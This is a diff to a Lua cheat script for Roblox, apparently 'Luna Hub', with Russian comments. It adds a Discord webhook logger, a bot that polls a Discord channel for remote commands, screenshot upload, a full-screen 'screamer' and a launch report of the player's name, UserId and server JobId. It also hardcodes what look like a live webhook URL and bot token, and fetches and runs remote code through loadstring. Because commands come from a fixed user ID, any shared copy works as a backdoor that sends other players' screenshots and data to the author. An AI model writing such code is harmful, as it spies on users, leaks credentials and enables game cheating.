@@ -67,6 +67,11 @@ if not okSvc or not Players or not LocalPlayer then
     return
 end
 
+-- Проверка HttpService
+if not HttpService then
+    warn("[Luna] HttpService недоступен - webhook не будет работать")
+end
+
 local VIM
 pcall(function() VIM = game:GetService("VirtualInputManager") end)
 
@@ -87,7 +92,26 @@ do
     local lastErr
     for _, url in ipairs(sources) do
         local ok, lib = pcall(function()
-            return loadstring(game:HttpGet(url))()
+            local source = game:HttpGet(url)
+            -- ====================================================
+            -- ПАТЧ Luna: вырубаем BlurModule чтобы не было лавины
+            -- "WedgeMesh is not a valid member of Part" на каждом кадре.
+            -- ====================================================
+            -- Luna's BlurModule биндится на RenderStep через
+            -- `RunService:BindToRenderStep(uid, 2000, UpdateOrientation)`.
+            -- Вырезаем это бинд-вызов — модуль создаёт 3D plane'ы, но
+            -- не обновляет их каждый кадр → крашей нет.
+            --
+            -- Ещё BlurModule зовут просто `BlurModule(<frame>)` 5+ раз
+            -- (для Main, Notification, MobileSupport). Заменяем САМО ОПРЕДЕЛЕНИЕ
+            -- функции на пустую заглушку — стоит ОДИН раз заменить
+            -- "local function BlurModule(Frame)" на тот же header + return.
+            source = source:gsub(
+                "local function BlurModule%(Frame%)",
+                "local function BlurModule(Frame) if true then return end -- DISABLED",
+                1
+            )
+            return loadstring(source)()
         end)
         if ok and type(lib) == "table" and lib.CreateWindow then
             Luna = lib
@@ -115,69 +139,444 @@ local function track(conn)
 end
 
 -- ====================================================
--- 📝 КРАШ-ЛОГГЕР
+-- 📝 КРАШ-ЛОГГЕР + DISCORD WEBHOOK
 -- ====================================================
 -- Пишет файл LunaHub_log.txt в папку workspace executor'а. Каждая строка
 -- сразу сбрасывается на диск (writefile перезаписывает файл целиком), так
 -- что при краше Roblox мы НЕ ТЕРЯЕМ последние записи.
 --
--- Дополнительно: подключается LogService:MessageOut и ловит ВСЕ
--- error/warning из Roblox (включая внутренние). При краше можно открыть файл
--- и увидеть последние 200 строк перед смертью.
+-- Дополнительно отправляет сводки на Discord webhook раз в N секунд +
+-- немедленно при любом ERROR/WARN.
 --
--- Файл лежит в workspace инжектора (зависит от executor'а):
---   AWP/Wave: AWP/workspace/LunaHub_log.txt
---   Krnl:     Krnl/workspace/LunaHub_log.txt
---   Synapse:  workspace/LunaHub_log.txt
+-- Обёрнут в подфункцию setupLogger() — все internal-локалки уходят в её
+-- scope, не съедают лимит 200 локальных переменных main chunk.
 local LOG_PATH = "LunaHub_log.txt"
-local LOG_MAX_LINES = 500
-local logBuffer = {}
-local logIndex = 0
-local logHasIO = (writefile ~= nil)
 
-local function logFlush()
-    if not logHasIO then return end
-    pcall(function()
-        writefile(LOG_PATH, table.concat(logBuffer, "\n"))
-    end)
-end
+-- ⚠ Замени URL на свой webhook.
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1508070234102300812/i9R3yqZA8BbFWErl45yUNbu9rRKxqgzoJO29FnwtqymlbZTG_QCfOGUtN7vKsyuS4iSR"
 
-local function lunaLog(level, message)
-    logIndex = logIndex + 1
-    local line = string.format("[%s] [%05d] [%s] %s",
-        os.date("%H:%M:%S"), logIndex, level, tostring(message))
-    table.insert(logBuffer, line)
-    -- Обрезаем буфер чтобы не разрастался бесконечно
-    if #logBuffer > LOG_MAX_LINES then
-        table.remove(logBuffer, 1)
+-- ====================================================
+-- 🤖 DISCORD BOT REMOTE CONTROL — управление СВОИМ клиентом
+-- ====================================================
+-- Скрипт каждые pollInterval сек опрашивает приватный Discord-канал и
+-- выполняет команды, которые ОТПРАВИЛ ТЫ САМ (фильтр по userId).
+--
+-- Как настроить:
+--   1. Создай бота: https://discord.com/developers/applications → New Application
+--      → Bot → Reset Token (скопируй).
+--   2. В Bot Permissions включи: Read Messages, Send Messages, Read Message History.
+--   3. Privileged Intents: включи MESSAGE CONTENT INTENT.
+--   4. OAuth2 → URL Generator → scopes: bot → permissions: Read/Send/History →
+--      пригласи бота в свой ПРИВАТНЫЙ канал (только для тебя).
+--   5. Скопируй Channel ID (правый клик по каналу в Discord с Developer Mode).
+--   6. Свой User ID — правый клик по своему профилю → Copy User ID.
+--   7. Заполни поля ниже. Если оставить пустыми — bot polling выключен.
+--
+-- ВСЁ упаковано в одну таблицу чтобы не съедать лимит 200 локальных в main.
+local DiscordBot = {
+    token        = "MTUwODE2MzU3Njc1NjU3MjE3MQ.GYYW7q.sbON-rJ-gQNF5mejkJGB418IOIoS8WBjhF551U",
+    channelId    = "1508070219866705940",
+    userId       = "991408239201759273",
+    pollInterval = 5,    -- секунд между опросами Discord API
+
+    -- Asset IDs скримера. Можно менять на любые работающие аудио/изображение.
+    -- Для звука нужен ID типа Audio (не Video / Image), иначе Roblox откажет
+    -- ("Asset type does not match requested type").
+    -- Картинка может быть https://cdn.discordapp.com/... — Roblox это пропускает.
+    screamerImage = "https://cdn.discordapp.com/attachments/1508070219866705940/1508172918465499177/latest.png",
+    screamerSound = "rbxassetid://75882358295790",
+}
+
+-- Возвращает таблицу-фасад логгера. Все локалки скрыты в closure.
+local Log = (function()
+    local LOG_MAX_LINES = 500
+    local logBuffer     = {}
+    local logIndex      = 0
+    local logHasIO      = (writefile ~= nil)
+
+    local WH = {
+        queue        = {},
+        busy         = false,
+        lastSent     = 0,
+        minInterval  = 2.0,
+        request      = (syn and syn.request)
+                    or (http and http.request)
+                    or http_request
+                    or (fluxus and fluxus.request)
+                    or request,
+        encode       = function(t) return game:GetService("HttpService"):JSONEncode(t) end,
+    }
+
+    local function _httpPostJson(url, jsonBody)
+        if not WH.request then return false, "no http_request API" end
+        local req = {
+            Url     = url,  url     = url,
+            Method  = "POST", method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["User-Agent"]   = "LunaHub-Logger/1.0",
+            },
+            headers = {
+                ["Content-Type"] = "application/json",
+                ["User-Agent"]   = "LunaHub-Logger/1.0",
+            },
+            Body    = jsonBody, body = jsonBody,
+        }
+        local ok, resp = pcall(WH.request, req)
+        if not ok then return false, tostring(resp) end
+        local code = resp.StatusCode or resp.status_code or resp.statusCode or resp.Status or 0
+        if code >= 200 and code < 300 then return true, code end
+        return false, ("HTTP " .. tostring(code) .. " "
+            .. tostring(resp.StatusMessage or resp.statusMessage or resp.Body or resp.body or ""))
     end
-    -- Дублируем в Output Roblox (для F9, если игра не крашнется)
-    print(line)
-    -- Каждая запись = немедленный flush на диск
-    logFlush()
+
+    -- GET-запрос с авторизацией (для Discord Bot API).
+    -- authHeader — например "Bot <TOKEN>". Возвращает (ok, body_string) или (false, errorMsg).
+    local function _httpGet(url, authHeader)
+        if not WH.request then return false, "no http_request API" end
+        local headers = {
+            ["User-Agent"] = "LunaHub-Bot/1.0",
+        }
+        if authHeader and authHeader ~= "" then
+            headers["Authorization"] = authHeader
+        end
+        local req = {
+            Url     = url,  url     = url,
+            Method  = "GET", method = "GET",
+            Headers = headers, headers = headers,
+        }
+        local ok, resp = pcall(WH.request, req)
+        if not ok then return false, tostring(resp) end
+        local code = resp.StatusCode or resp.status_code or resp.statusCode or resp.Status or 0
+        local body = resp.Body or resp.body or ""
+        if code >= 200 and code < 300 then return true, body end
+        return false, ("HTTP " .. tostring(code) .. " " .. tostring(body))
+    end
+
+    -- ====================================================
+    -- Multipart/form-data POST для отправки файлов в Discord
+    -- ====================================================
+    -- Discord webhook принимает файлы только через multipart, не JSON.
+    -- Формат:
+    --   --BOUNDARY\r\n
+    --   Content-Disposition: form-data; name="payload_json"\r\n\r\n
+    --   { "content": "...", "username": "..." }\r\n
+    --   --BOUNDARY\r\n
+    --   Content-Disposition: form-data; name="files[0]"; filename="ss.png"\r\n
+    --   Content-Type: image/png\r\n\r\n
+    --   <binary bytes>\r\n
+    --   --BOUNDARY--\r\n
+    local function _httpPostMultipart(url, fileBytes, filename, contentType, payloadJson)
+        if not WH.request then return false, "no http_request API" end
+        local boundary = "----LunaHubBoundary" .. tostring(math.random(1e9, 1e10))
+        local CRLF = "\r\n"
+        local parts = {
+            "--" .. boundary,
+            'Content-Disposition: form-data; name="payload_json"',
+            "Content-Type: application/json",
+            "",
+            payloadJson or "{}",
+            "--" .. boundary,
+            ('Content-Disposition: form-data; name="files[0]"; filename="%s"'):format(filename or "file.png"),
+            "Content-Type: " .. (contentType or "application/octet-stream"),
+            "",
+            fileBytes,
+            "--" .. boundary .. "--",
+            "",
+        }
+        local body = table.concat(parts, CRLF)
+        local req = {
+            Url     = url,  url     = url,
+            Method  = "POST", method = "POST",
+            Headers = {
+                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
+                ["User-Agent"]   = "LunaHub-Logger/1.0",
+            },
+            headers = {
+                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
+                ["User-Agent"]   = "LunaHub-Logger/1.0",
+            },
+            Body    = body, body = body,
+        }
+        local ok, resp = pcall(WH.request, req)
+        if not ok then return false, tostring(resp) end
+        local code = resp.StatusCode or resp.status_code or resp.statusCode or resp.Status or 0
+        if code >= 200 and code < 300 then return true, code end
+        return false, ("HTTP " .. tostring(code) .. " "
+            .. tostring(resp.StatusMessage or resp.statusMessage or resp.Body or resp.body or ""))
+    end
+
+    -- Скриншот: пробуем executor's API в порядке приоритета.
+    -- Возвращает (bytes_string, filename, contentType) или (nil, errorMsg).
+    local function _captureScreenshot()
+        -- 1) Synapse-style: hookfunction over RBXImageHandler. Нет в большинстве.
+        -- 2) Wave/Fluxus: глобальная screenshot() — возвращает PNG-bytes.
+        -- 3) Krnl/AWP: нет API; требуется CaptureService с Roblox >= 564.
+        -- 4) Roblox CaptureService: НЕ доступен из LocalScript на клиенте.
+        --
+        -- Самое широкое — пробуем глобальные функции по имени.
+        local candidates = {
+            "screenshot", "Screenshot",
+            "saveScreenshot", "SaveScreenshot",
+            "request_screenshot", "captureScreenshot",
+        }
+        for _, name in ipairs(candidates) do
+            local fn = _G[name] or rawget(_G, name) or getfenv()[name]
+            if type(fn) == "function" then
+                local ok, data = pcall(fn)
+                if ok and type(data) == "string" and #data > 100 then
+                    return data, "luna_ss.png", "image/png"
+                end
+            end
+        end
+        return nil, "executor не предоставляет API для скриншотов"
+    end
+
+    local function logFlush()
+        if not logHasIO then return end
+        pcall(function()
+            writefile(LOG_PATH, table.concat(logBuffer, "\n"))
+        end)
+    end
+
+    local function _whSendNow(content, username, embedFields)
+        if not WEBHOOK_URL or WEBHOOK_URL == "" then return false end
+        if not WH.request then return false end
+        local body = { username = username or "Luna Hub Logger" }
+        if content and content ~= "" then body.content = content end
+        if embedFields then body.embeds = embedFields end
+        local ok, jsonBody = pcall(WH.encode, body)
+        if not ok then return false end
+        return _httpPostJson(WEBHOOK_URL, jsonBody)
+    end
+
+    local function _whProcessQueue()
+        if WH.busy then return end
+        WH.busy = true
+        task.spawn(function()
+            while #WH.queue > 0 do
+                local now = tick()
+                local wait = WH.minInterval - (now - WH.lastSent)
+                if wait > 0 then task.wait(wait) end
+                local item = table.remove(WH.queue, 1)
+                WH.lastSent = tick()
+                _whSendNow(item.content, item.username, item.embeds)
+            end
+            WH.busy = false
+        end)
+    end
+
+    local function sendToWebhook(content, opts)
+        opts = opts or {}
+        if (not content or content == "") and not opts.embeds then return end
+        -- Защита от лавины: если в очереди >20 необработанных сообщений,
+        -- значит у нас спам-петля или Discord rate-limit'нул нас.
+        -- В таком случае отбрасываем, чтобы не накопить мегабайты в памяти.
+        if #WH.queue >= 20 then return end
+        table.insert(WH.queue, {
+            content  = content,
+            username = opts.username,
+            embeds   = opts.embeds,
+        })
+        _whProcessQueue()
+    end
+
+    local function sendLogToWebhook(reason)
+        if #logBuffer == 0 then return end
+        local lastLines = {}
+        local startI = math.max(1, #logBuffer - 15)
+        for i = startI, #logBuffer do
+            table.insert(lastLines, logBuffer[i])
+        end
+        local block = table.concat(lastLines, "\n")
+        if #block > 1850 then block = string.sub(block, -1850) end
+        local content
+        if reason and reason ~= "" then
+            content = "**" .. reason .. "**\n```\n" .. block .. "\n```"
+        else
+            content = "```\n" .. block .. "\n```"
+        end
+        sendToWebhook(content)
+    end
+
+    -- Чёрный список: подстроки, при наличии которых сообщение НЕ логируется.
+    -- Сюда попадают шумные/циклические ошибки самой Luna (BlurModule крашит на
+    -- каждом кадре когда Roblox обновляет API частей), которые мы не хотим:
+    --   * захламляют файл-лог
+    --   * крашат Discord webhook ratelimit
+    --   * убивают FPS из-за самих writefile/print вызовов
+    local LOG_BLACKLIST = {
+        "WedgeMesh is not a valid member",
+        "fireRenderStepEarlyFunctions",
+        -- Стектрейсы из BlurModule — приходят отдельным сообщением:
+        "DrawTriangle",
+        "DrawQuad",
+        "UpdateOrientation",
+        -- Luna ColorPicker initialization warnings
+        "Luna Interface Suite | Color",
+        -- Roblox общие safe-to-ignore
+        "Timeout waiting for assets",
+        "Idle",
+        -- BlurModule-related stack lines
+        "BlurModule",
+        "init, line 637",
+        -- nukeBlur-побочка
+        "UnbindFromRenderStep removed different functions",
+    }
+    local function _isBlacklisted(msg)
+        if type(msg) ~= "string" then return false end
+        for _, pat in ipairs(LOG_BLACKLIST) do
+            if string.find(msg, pat, 1, true) then return true end
+        end
+        return false
+    end
+
+    -- Дедупликация. Если приходит ИДЕНТИЧНОЕ сообщение в пределах 5 секунд —
+    -- увеличиваем счётчик и переписываем последнюю строку буфера как
+    -- "(xN) msg" вместо добавления тысячи дублей.
+    local lastMsgKey   = nil
+    local lastMsgCount = 0
+    local lastMsgTime  = 0
+
+    local function lunaLog(level, message)
+        local msgStr = tostring(message)
+        if _isBlacklisted(msgStr) then return end   -- тихо игнорируем шум
+
+        local key = level .. "|" .. msgStr
+        local now = tick()
+        if key == lastMsgKey and (now - lastMsgTime) < 5 then
+            lastMsgCount = lastMsgCount + 1
+            if #logBuffer > 0 then
+                logBuffer[#logBuffer] = string.format(
+                    "[%s] [%05d] [%s] (x%d) %s",
+                    os.date("%H:%M:%S"), logIndex, level, lastMsgCount, msgStr)
+            end
+            lastMsgTime = now
+            -- writefile только каждые 10 повторов, чтобы не убить FPS на дубль
+            if lastMsgCount % 10 == 0 then logFlush() end
+            return
+        end
+        lastMsgKey   = key
+        lastMsgCount = 1
+        lastMsgTime  = now
+
+        logIndex = logIndex + 1
+        local line = string.format("[%s] [%05d] [%s] %s",
+            os.date("%H:%M:%S"), logIndex, level, msgStr)
+        table.insert(logBuffer, line)
+        if #logBuffer > LOG_MAX_LINES then
+            table.remove(logBuffer, 1)
+        end
+        print(line)
+        logFlush()
+        if level == "ERROR" or level == "ROBLOX_ERR" or level == "SCRIPT_ERR" then
+            sendLogToWebhook("⚠ " .. level)
+        elseif level == "WARN" or level == "ROBLOX_WARN" then
+            if logIndex % 10 == 0 then sendLogToWebhook("WARN batch") end
+        elseif level == "HEARTBEAT" then
+            -- HEARTBEAT не шлём в Discord
+        else
+            if logIndex % 25 == 0 then sendLogToWebhook() end
+        end
+    end
+
+    -- Скриншот в Discord. Если executor поддерживает screenshot()/getframerate()
+    -- — снимает кадр и шлёт картинкой. Иначе возвращает (false, "no api").
+    local function sendScreenshotToWebhook(caption)
+        local bytes, fname, ctype = _captureScreenshot()
+        if not bytes then
+            return false, fname  -- здесь fname = errorMsg
+        end
+        local payload = pcall(WH.encode, {
+            username = "Luna Hub Logger",
+            content  = caption or ("Screenshot " .. os.date("%H:%M:%S")),
+        })
+        local payloadJson
+        local ok
+        ok, payloadJson = pcall(WH.encode, {
+            username = "Luna Hub Logger",
+            content  = caption or ("Screenshot " .. os.date("%H:%M:%S")),
+        })
+        if not ok then payloadJson = "{}" end
+        return _httpPostMultipart(WEBHOOK_URL, bytes, fname, ctype, payloadJson)
+    end
+
+    -- Публичный фасад: всё через одну таблицу.
+    return {
+        log              = lunaLog,
+        flush            = logFlush,
+        sendToWebhook    = sendToWebhook,
+        sendLogToWebhook = sendLogToWebhook,
+        sendScreenshot   = sendScreenshotToWebhook,
+        rawPost          = _httpPostJson,
+        rawPostMultipart = _httpPostMultipart,
+        rawGet           = _httpGet,
+        captureScreenshot = _captureScreenshot,
+        WH               = WH,
+        getBuffer        = function() return logBuffer end,
+        clearBuffer      = function()
+            logBuffer = {}; logIndex = 0; logFlush()
+        end,
+        getPath          = function() return LOG_PATH end,
+        hasIO            = function() return logHasIO end,
+    }
+end)()
+
+-- Аккуратные шорткаты для остального кода
+local function lunaLog(level, msg) Log.log(level, msg) end
+local function logInfo(msg)        Log.log("INFO",  msg) end
+local function logWarn(msg)        Log.log("WARN",  msg) end
+local function logError(msg)       Log.log("ERROR", msg) end
+local function sendToWebhook(c, o) Log.sendToWebhook(c, o) end
+local function sendLogToWebhook(r) Log.sendLogToWebhook(r) end
+
+-- ====================================================
+-- Стартовая запись + дамп окружения
+-- ====================================================
+lunaLog("INFO", "===== LUNA HUB START =====")
+
+-- Стартовый embed-сэмпл с информацией для Discord
+do
+    local execName = (identifyexecutor and identifyexecutor()) or "unknown"
+    local plName   = (LocalPlayer and LocalPlayer.Name) or "?"
+    local plDisp   = (LocalPlayer and LocalPlayer.DisplayName) or plName
+    local userId   = (LocalPlayer and LocalPlayer.UserId) or 0
+    local placeId  = tostring(game.PlaceId)
+    local jobId    = tostring(game.JobId)
+
+    local embed = {
+        {
+            title = "🌙 Luna Hub — запуск",
+            color = 0x9d6dff,
+            description = ("Игрок **%s** (`%s`) загрузил скрипт"):format(plDisp, plName),
+            fields = {
+                { name = "Executor",  value = execName, inline = true },
+                { name = "UserId",    value = tostring(userId), inline = true },
+                { name = "PlaceId",   value = placeId, inline = true },
+                { name = "JobId",     value = jobId ~= "" and jobId or "studio", inline = false },
+                { name = "FileIO",    value = tostring(Log.hasIO()), inline = true },
+                { name = "HTTP API",  value = Log.WH.request and "available" or "MISSING", inline = true },
+            },
+            footer = { text = "LunaHub Logger" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }
+    }
+    -- Шлём через очередь чтобы не получить flood
+    sendToWebhook(nil, { embeds = embed, username = "Luna Hub" })
 end
 
--- Хелпер для удобства из callback'ов
-local function logInfo(msg)  lunaLog("INFO",  msg) end
-local function logWarn(msg)  lunaLog("WARN",  msg) end
-local function logError(msg) lunaLog("ERROR", msg) end
-
--- Стартовая запись + дамп окружения
-lunaLog("INFO", "===== LUNA HUB START =====")
 pcall(function()
     lunaLog("INFO", "Game: " .. tostring(game.Name) .. "  PlaceId: " .. tostring(game.PlaceId))
     lunaLog("INFO", "Executor: " .. (identifyexecutor and tostring(identifyexecutor()) or "unknown"))
     lunaLog("INFO", "Player: " .. (LocalPlayer and LocalPlayer.Name or "?"))
-    lunaLog("INFO", "FileIO available: " .. tostring(logHasIO))
+    lunaLog("INFO", "FileIO available: " .. tostring(Log.hasIO()))
+    lunaLog("INFO", "HTTP request API: " .. (Log.WH.request and "available" or "MISSING"))
 end)
 
 -- Глобальный перехватчик ошибок Roblox через LogService.
--- Ловим warning/error/всё что прилетает через game:GetService("LogService").
--- pcall — потому что в некоторых executor'ах LogService может быть закрыт.
 pcall(function()
     local LogService = game:GetService("LogService")
     track(LogService.MessageOut:Connect(function(msg, msgType)
-        -- msgType: Output / Info / Warning / Error
         if msgType == Enum.MessageType.MessageWarning then
             lunaLog("ROBLOX_WARN", msg)
         elseif msgType == Enum.MessageType.MessageError then
@@ -186,8 +585,7 @@ pcall(function()
     end))
 end)
 
--- ScriptContext.Error ловит "сырые" исключения скриптов (даже до того как
--- они попадут в LogService). Даёт сообщение, stacktrace и сам скрипт.
+-- ScriptContext.Error ловит "сырые" исключения скриптов.
 pcall(function()
     local SC = game:GetService("ScriptContext")
     track(SC.Error:Connect(function(message, stack, scriptInst)
@@ -203,6 +601,7 @@ end)
 -- Heartbeat-маячок раз в 5 секунд. Последняя запись покажет в логе момент
 -- зависания/краша. Включает FPS и текущее состояние циклов.
 do
+    local startTime  = tick()
     local frameTimes = {}
     local sumDt = 0
     track(game:GetService("RunService").Heartbeat:Connect(function(dt)
@@ -214,16 +613,18 @@ do
         while _G.LunaHubLoaded ~= false do
             task.wait(5)
             local fps = (#frameTimes > 0 and sumDt > 0) and (#frameTimes / sumDt) or 0
+            local uptime = math.floor(tick() - startTime)
             -- НЕ записываем если ничего интересного не происходит — иначе лог
             -- забьётся "alive" строками. Логируем только если запущен фарм.
             if sp_enabled or sp_bossEnabled then
                 lunaLog("HEARTBEAT", string.format(
-                    "fps=%.1f quest=%s boss=%s state=%s mob=%s",
+                    "fps=%.1f quest=%s boss=%s state=%s mob=%s uptime=%ds",
                     fps,
                     sp_enabled and "ON" or "off",
                     sp_bossEnabled and "ON" or "off",
                     tostring(_G.QuestState),
-                    sp_currentMob and sp_currentMob.Name or "nil"))
+                    sp_currentMob and sp_currentMob.Name or "nil",
+                    uptime))
             end
         end
     end)
@@ -244,11 +645,16 @@ end
 --   notify("сообщение")          → info
 --   notify("ок!", 2, "success")   → check_circle
 --   notify("ой!", 4, "error")     → error
+--
+-- ВАЖНО: ключи Luna Material-таблицы для warning/error начинаются с
+-- подчёркивания ("_warning", "_error", "_notification_important", "_add_alert").
+-- Это особенность их именования (см. source.lua строка ~1170). Если использовать
+-- "warning" / "error" — GetIcon вернёт nil → "Image: ContentId expected, got nil".
 local NOTIFY_ICONS = {
     info    = "info",
     success = "check_circle",
-    warn    = "warning",
-    error   = "error",
+    warn    = "_warning",
+    error   = "_error",
 }
 local function notify(msg, dur, kind)
     -- Логируем КАЖДУЮ нотификацию — это хороший trail событий
@@ -309,8 +715,8 @@ local function lunaSetVisibility(state)
 end
 local function lunaIsVisible() return lunaVisible end
 
-
-
+-- Объявления safeGet* должны идти ДО любых хэндлеров CharacterAdded
+-- которые их используют — иначе на CharacterAdded получим "attempt to call nil".
 local function safeGetCharacter()
     return LocalPlayer and LocalPlayer.Character or nil
 end
@@ -320,6 +726,34 @@ end
 local function safeGetHRP(c)
     return c and c:FindFirstChild("HumanoidRootPart") or nil
 end
+
+-- Сбор данных о персонаже при смене
+track(LocalPlayer.CharacterAdded:Connect(function(char)
+    logInfo("Персонаж возродился: " .. char.Name)
+    local hum = safeGetHumanoid(char)
+    if hum then
+        logInfo("HP: " .. hum.Health .. "/" .. hum.MaxHealth)
+        logInfo("WalkSpeed: " .. hum.WalkSpeed)
+        logInfo("JumpPower: " .. hum.JumpPower)
+    end
+end))
+
+track(LocalPlayer.CharacterRemoving:Connect(function(char)
+    logInfo("Персонаж удален: " .. (char and char.Name or "unknown"))
+end))
+
+-- Отправка логов при смерти
+track(LocalPlayer.CharacterAdded:Connect(function(char)
+    local hum = char:WaitForChild("Humanoid", 5)
+    if hum then
+        track(hum.HealthChanged:Connect(function(h)
+            if h <= 0 then
+                logInfo("☠️ СМЕРТЬ: HP=" .. h)
+                sendLogToWebhook()
+            end
+        end))
+    end
+end))
 
 local function isSameTeam(plr)
     if not LocalPlayer then return false end
@@ -401,9 +835,11 @@ do
     glow.Parent = bg
     local glowCorner = Instance.new("UICorner"); glowCorner.CornerRadius = UDim.new(1, 0); glowCorner.Parent = glow
     local glowGrad = Instance.new("UIGradient")
+    local c1 = Color3.fromRGB(180, 120, 255)
+    local c2 = Color3.fromRGB(60, 20, 110)
     glowGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 120, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 20, 110)),
+        ColorSequenceKeypoint.new(0, c1),
+        ColorSequenceKeypoint.new(1, c2),
     })
     glowGrad.Transparency = NumberSequence.new({
         NumberSequenceKeypoint.new(0, 0.7),
@@ -572,10 +1008,13 @@ do
 
     -- Градиент по тексту (бело-фиолетовый сверху-вниз)
     local titleGrad = Instance.new("UIGradient")
+    local tc1 = Color3.fromRGB(255, 240, 255)
+    local tc2 = Color3.fromRGB(220, 180, 255)
+    local tc3 = Color3.fromRGB(170, 110, 230)
     titleGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 240, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 180, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 110, 230)),
+        ColorSequenceKeypoint.new(0, tc1),
+        ColorSequenceKeypoint.new(0.5, tc2),
+        ColorSequenceKeypoint.new(1, tc3),
     })
     titleGrad.Rotation = 90
     titleGrad.Parent = title
@@ -616,9 +1055,11 @@ do
     local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(1, 0); bc.Parent = bar
 
     local barGrad = Instance.new("UIGradient")
+    local bc1 = Color3.fromRGB(255, 200, 240)
+    local bc2 = Color3.fromRGB(150, 80, 230)
     barGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 240)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 80, 230)),
+        ColorSequenceKeypoint.new(0, bc1),
+        ColorSequenceKeypoint.new(1, bc2),
     })
     barGrad.Parent = bar
 
@@ -787,6 +1228,226 @@ do
         return
     end
     Window = win
+end
+
+-- ====================================================
+-- BlurModule отключён через source-патч в loadstring (см. блок загрузки Luna).
+-- Дополнительный «уборщик» больше не требуется — BlurModule просто ничего
+-- не создаёт. На всякий случай при старте сносим артефакты от прошлых
+-- сессий (если скрипт уже запускался без патча).
+-- ====================================================
+do
+    pcall(function()
+        local cam = workspace.CurrentCamera
+        if cam then
+            local blur = cam:FindFirstChild("LunaBlur")
+            if blur then blur:Destroy() end
+        end
+        for _, d in ipairs(game:GetService("Lighting"):GetChildren()) do
+            if d:IsA("DepthOfFieldEffect") and d.Name:sub(1, 4) == "DPT_" then
+                d:Destroy()
+            end
+        end
+    end)
+end
+
+-- ====================================================
+-- 😱 SCREAMER — пугалка для проверки на СВОЁМ клиенте
+-- ====================================================
+-- Создаёт ScreenGui на весь экран с резким изображением + звук.
+-- Вызывается:
+--   • вручную из UI (кнопка в Settings)
+--   • удалённо через Discord-команду !screamer
+-- В обоих случаях работает только на ЭТОМ клиенте.
+DiscordBot.playScreamer = function()
+    pcall(function()
+        local hostUi = (gethui and gethui()) or game:GetService("CoreGui")
+        local g = Instance.new("ScreenGui")
+        g.Name = "LunaHubScreamer"
+        g.IgnoreGuiInset = true
+        g.DisplayOrder = 999999
+        g.ResetOnSpawn = false
+        g.Parent = hostUi
+
+        local f = Instance.new("Frame", g)
+        f.Size = UDim2.fromScale(1, 1)
+        f.BackgroundColor3 = Color3.new(0, 0, 0)
+        f.BorderSizePixel = 0
+
+        local img = Instance.new("ImageLabel", f)
+        img.Size = UDim2.fromScale(1, 1)
+        img.BackgroundTransparency = 1
+        img.Image = DiscordBot.screamerImage
+        img.ScaleType = Enum.ScaleType.Stretch
+
+        local snd = Instance.new("Sound", f)
+        snd.SoundId = DiscordBot.screamerSound
+        snd.Volume = 4
+        snd.Parent = f
+        pcall(function() snd:Play() end)
+
+        task.delay(10, function()
+            pcall(function() g:Destroy() end)
+        end)
+    end)
+    lunaLog("INFO", "🎃 screamer triggered")
+end
+
+-- ====================================================
+-- 🤖 DISCORD BOT POLLER — управление СВОИМ клиентом из Discord
+-- ====================================================
+-- Опрашивает Discord канал каждые DiscordBot.pollInterval секунд, читает
+-- последние сообщения, парсит команды от ТВОЕГО user_id.
+--
+-- Поддерживаемые команды (префикс "!"):
+--   !ping           — пинг для проверки связи
+--   !status         — текущее состояние (фарм, босс, FPS)
+--   !farm on/off    — включить/выключить квестовый авто-фарм
+--   !boss on/off    — включить/выключить boss-фарм
+--   !screenshot     — снять скриншот и прислать в Discord
+--   !screamer       — запустить скример НА СВОЁМ клиенте (для теста)
+--   !unload         — выгрузить скрипт
+--   !help           — показать список команд
+do
+    if DiscordBot.token == "" or DiscordBot.channelId == "" or DiscordBot.userId == "" then
+        lunaLog("INFO", "Discord bot polling: DISABLED (заполни DiscordBot.{token,channelId,userId} чтобы включить)")
+    else
+        lunaLog("INFO", "Discord bot polling: ENABLED, interval=" .. tostring(DiscordBot.pollInterval) .. "s")
+
+        local lastMessageId = nil
+        local HttpService = game:GetService("HttpService")
+
+        local function handleCommand(cmd, args)
+            cmd = cmd:lower()
+            if cmd == "!ping" then
+                return "🏓 pong! game=`" .. tostring(game.Name) .. "`"
+            elseif cmd == "!status" then
+                return string.format(
+                    "📊 **Status**\n"
+                    .. "• Farm: %s\n• Boss: %s\n• God: %s\n• Anti-DMG: %s\n"
+                    .. "• Current target: `%s`\n• Game: `%s`",
+                    sp_enabled and "ON" or "off",
+                    sp_bossEnabled and "ON" or "off",
+                    godModeEnabled and "ON" or "off",
+                    sp_antiDamage and "ON" or "off",
+                    sp_currentMob and sp_currentMob.Name or "nil",
+                    tostring(game.Name))
+            elseif cmd == "!farm" then
+                local arg = (args[1] or ""):lower()
+                if arg == "on" then
+                    if not sp_enabled then spStart() end
+                    return "✅ farm started"
+                elseif arg == "off" then
+                    if sp_enabled then spStop() end
+                    return "🛑 farm stopped"
+                else
+                    return "use `!farm on` or `!farm off`"
+                end
+            elseif cmd == "!boss" then
+                local arg = (args[1] or ""):lower()
+                if arg == "on" then
+                    if not sp_bossEnabled then spBossStart() end
+                    return "✅ boss farm started"
+                elseif arg == "off" then
+                    if sp_bossEnabled then spBossStop() end
+                    return "🛑 boss farm stopped"
+                else
+                    return "use `!boss on` or `!boss off`"
+                end
+            elseif cmd == "!screenshot" or cmd == "!ss" then
+                task.spawn(function()
+                    local ok, info = Log.sendScreenshot("📸 remote screenshot")
+                    if not ok then
+                        sendToWebhook("❌ screenshot failed: " .. tostring(info))
+                    end
+                end)
+                return "📸 capturing..."
+            elseif cmd == "!screamer" or cmd == "!scream" then
+                DiscordBot.playScreamer()
+                return "😱 screamer triggered"
+            elseif cmd == "!unload" then
+                if _G.LunaUnload then
+                    task.delay(0.5, function() _G.LunaUnload() end)
+                    return "💀 unloading in 500ms..."
+                end
+                return "no unload function"
